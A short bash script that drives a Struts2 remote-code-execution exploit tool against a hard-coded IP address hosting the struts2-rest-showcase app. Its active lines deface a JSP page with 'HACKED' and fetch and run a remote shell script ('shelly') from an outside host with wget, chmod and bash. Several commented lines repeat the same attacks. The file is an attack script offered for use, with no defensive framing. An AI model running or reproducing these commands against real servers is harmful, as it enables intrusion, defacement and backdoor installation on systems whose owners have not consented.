#!/bin/bash

#All these work too
#python3 struts-pwn.py --check --url 'http://52.24.68.85:8080/struts2-rest-showcase/orders/new'
#python3 struts-pwn.py --url 'http://52.24.68.85:8080/struts2-rest-showcase/orders/new' -c 'id'
#python3 struts-pwn.py --url 'http://52.24.68.85:8080/struts2-rest-showcase/orders/new' -c "sed -i -e 's/Orders/HACKED/g' webapps/struts2-rest-showcase/WEB-INF/content/orders-index.jsp"
#python3 struts-pwn.py --url 'http://52.24.68.85:8080/struts2-rest-showcase/orders/new' -c "wget http://rrbeliveau.com/tools/shelly; chmod +x shelly; bash shelly"

#python3 struts-pwn.py --check --url 'http://52.24.68.85:8080/struts2-rest-showcase/orders/'
#read asd
#python3 struts-pwn.py --url 'http://52.24.68.85:8080/struts2-rest-showcase/orders/' -c 'id'
#read asf
python3 struts-pwn.py --url 'http://52.24.68.85:8080/struts2-rest-showcase/orders/' -c "sed -i -e 's/Orders/HACKED/g' webapps/struts2-rest-showcase/WEB-INF/content/orders-index.jsp"
read asg
python3 struts-pwn.py --url 'http://52.24.68.85:8080/struts2-rest-showcase/orders/' -c "wget http://rrbeliveau.com/tools/shelly; chmod +x shelly; bash shelly"






# Works!
#python struts-pwn2.py http://52.24.68.85:8080/struts2-rest-showcase/orders/new      "wget http://rrbeliveau.com/tools/shelly; chmod +x shelly; bash shelly"

